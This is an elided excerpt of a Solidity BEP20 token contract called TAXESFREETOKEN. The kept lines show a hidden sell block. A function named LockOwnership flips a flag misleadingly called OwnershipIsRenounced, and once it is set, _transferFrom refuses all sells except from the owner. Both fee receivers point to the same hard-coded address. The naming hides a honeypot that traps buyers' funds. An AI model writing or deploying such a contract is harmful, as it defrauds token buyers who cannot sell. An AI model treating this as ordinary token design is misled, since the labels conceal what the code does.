...
contract TAXESFREETOKEN is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "TAXESFREETOKEN";
    ...
    address public autoLiquidityReceiver=0x499d298317b6Dd5feE46fe6023E29fbEE94718D4;
    address public marketingFeeReceiver=0x499d298317b6Dd5feE46fe6023E29fbEE94718D4;
    ...
    bool OwnershipIsRenounced = false;
    bool public swapEnabled = true;
    bool SetRewards = false;
    ...
    function LockOwnership(bool value) external onlyOwner {
        OwnershipIsRenounced = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!OwnershipIsRenounced || sender==owner), "distribution enabled");
